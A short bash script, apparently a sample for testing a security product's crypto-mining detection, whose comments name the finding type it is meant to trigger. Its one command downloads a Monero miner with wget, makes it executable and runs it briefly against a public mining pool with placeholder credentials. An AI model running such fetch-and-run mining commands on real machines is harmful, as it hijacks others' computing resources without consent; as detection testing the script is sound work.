#!/bin/bash

# Type: Process
# Policy: Crypto mining threats
# Impact:Process/CryptoCurrency.CryptoMinerExecuted

wget -O my_miner https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64 && chmod +x my_miner && timeout 10 ./my_miner -o stratum+tcp://xmr.pool.minergate.com:45700 -u foo@yahoo.com -p bar
